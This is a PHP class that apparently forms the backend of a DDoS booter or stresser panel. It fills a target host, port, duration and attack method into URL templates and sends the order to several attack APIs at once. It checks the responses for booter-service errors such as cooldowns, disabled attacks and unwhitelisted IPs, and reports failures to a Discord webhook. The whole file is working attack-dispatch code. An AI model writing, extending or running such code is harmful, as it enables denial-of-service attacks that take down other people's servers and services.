<?php
class RequestApi {

    private string $host;

    private int $port;

    private int $time;

    private string $method;

    public function __construct(string $host, int $port, int $time, string $method)
    {
        $this->host = $host;
        $this->port = $port;
        $this->time = $time;
        $this->method = $method;
    }

    /**
     * Launch API requests and handle responses.
     *
     * This method sends requests to multiple APIs, handles responses,
     * and checks for errors. It returns an array of API responses.
     *
     * @return array An array of API responses.
     */
    public function launch()
    {
        global $apis_urls;
        $apiResponses = [];

        foreach ($apis_urls[$this->method] as $api) {
            $apiName = explode('/', $api);

            $curl = curl_init();
            curl_setopt_array($curl, [
                CURLOPT_URL => $this->generateFormattedUrl($api, $this->host, $this->port, $this->time),
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => API_TIMEOUT_AFTER,
                CURLOPT_CONNECTTIMEOUT => API_TIMEOUT_AFTER
            ]);
            $apiResponses[$apiName[2]] = curl_exec($curl);

            $errorStatus = $this->checkResponseForError($apiResponses[$apiName[2]]);

            if ($errorStatus != "OK") {
                $webhook = new DiscordWebhook(WEBHOOK_ERROR);
                $webhook->sendError($apiName['2'], $errorStatus);
            } 

            curl_close($curl);
        }

        return $apiResponses;
    }

    /**
     * Generate a formatted URL by replacing placeholders with provided values.
     *
     * This function takes a base URL containing placeholders and replaces them with
     * the specified host, port, and time values to create a formatted URL.
     *
     * @param string $baseURL The base URL containing placeholders.
     * @param string $host The host value to be inserted into the URL.
     * @param int $port The port number to be inserted into the URL.
     * @param int $time The time value to be inserted into the URL.
     *
     * @return string The resulting formatted URL.
     */
    public function generateFormattedUrl(string $baseURL, string $host, int $port, int $time) {
        $formattedURL = str_replace(['{self.host}', '{self.port}', '{self.time}'], [$host, $port, $time], $baseURL);
        return $formattedURL;
    }

    /**
     * Check the API response for common error patterns.
     *
     * This function analyzes the API response for specific error patterns and returns
     * corresponding error messages. If no error pattern is matched, it returns "OK."
     *
     * @param string $response The API response to be checked for errors.
     *
     * @return string The error message if an error pattern is found, or "OK" if no error is detected.
     */
    public function checkResponseForError($response) {
        $errorMessages = [
            "#Just a moment...#" => 'Cloudflare Captcha',
            "#Invalid key#" => 'Invalid Key',
            "#you are on cooldown for#" => 'Cooldown',
            "#all attacks are currently disabled#" => 'Api Disabled',
            "#PLS Whitelist#" => 'IP Not Whitelisted',
        ];
    
        foreach ($errorMessages as $pattern => $message) {
            if (preg_match($pattern, $response)) {
                return $message;
            }
        }
    
        if (empty($response)) {
            return 'HTTP Timeout'; // api bien finito
        }
    
        return "OK"; // rien a signaler wola
    }

}